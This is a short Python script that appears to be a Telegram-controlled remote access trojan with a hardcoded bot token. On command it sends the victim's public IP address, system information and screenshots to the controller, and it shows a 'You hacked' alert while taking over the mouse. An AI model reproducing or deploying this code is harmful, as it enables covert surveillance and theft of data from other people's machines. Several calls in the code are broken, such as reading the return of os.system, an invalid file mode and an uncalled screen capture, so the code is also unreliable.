#!/usr/bin/python
# # -*- coding: utf-8 -*-
#====================================importing====================================
import os, sys, random, time, math, urllib
try:
    import autopy
except ImportError:
    autopylib = input("you need to install `Autopy` library, Continue? [Y/N] ")
    if autopylib == 'y' or autopylib == 'Y' :
        os.system("pip install autopy")
        import autopy
    else:
        sys.exit()

try:
    from telegram.ext import Updater, CommandHandler
except ImportError:
    telelib = input("you need to install `python-telegram-bot` library, Continue? [Y/N] ")
    if telelib == 'y' or telelib == 'Y' :
        os.system("pip install python-telegram-bot")
        from telegram.ext import Updater, CommandHandler
    else:
        sys.exit()
#====================================******====================================
update = Updater("645656436:AAFdiNOljdPJ_m3UBGjvG_LZZEp5UPRg4eM")

def start_method(bot, update) :
    ip = urllib.urlopen("https://ip.42.pl/raw").read()

    chat_id = update.message.chat_id
    bot.sendMessage(chat_id, 'Connect to target.\nThis is  ip :'+ ip)
    
def systeminfo_method(bot, update) :
    x = os.system("systeminfo").read()

    chat_id = bot.message.chat_id
    bot.sendMessage(chat_id, x)

def screenshot_method(bot, update) :

    image = autopy.bitmap.capture_screen
    image.save("c:\\windows\\face.png")

    potho = open("c:\\windows\\face.png", 'rd')

    chat_id = bot.message.chat_id
    bot.sendMessage(chat_id, potho, "screenshot")

    potho.close()

def mouse_method(bot, update) :
    autopy.alert.alert("You hacked")

    TWO_PI = math.pi * 2.0

    width, height = autopy.screen.size()
    height /= 2
    height -= 10  # Stay in the screen bounds.

    for x in range(int(width)):
        y = int(height * math.sin((TWO_PI * x) / width) + height)
        autopy.mouse.move(x, y)
        time.sleep(random.uniform(0.001, 0.003))

    chat_id = update.message.chat_id
    bot.sendMessage(chat_id, "comment is showed")

start_command = CommandHandler("start", start_method)
update.dispatcher.add_handler(start_command)

systeminfo_command = CommandHandler("system", systeminfo_method)
update.dispatcher.add_handler(systeminfo_command)

screenshot = CommandHandler("screenshot", screenshot_method)
update.dispatcher.add_handler(screenshot)

mouse_command = CommandHandler("mouse", mouse_method)
update.dispatcher.add_handler(mouse_command)


update.start_polling()
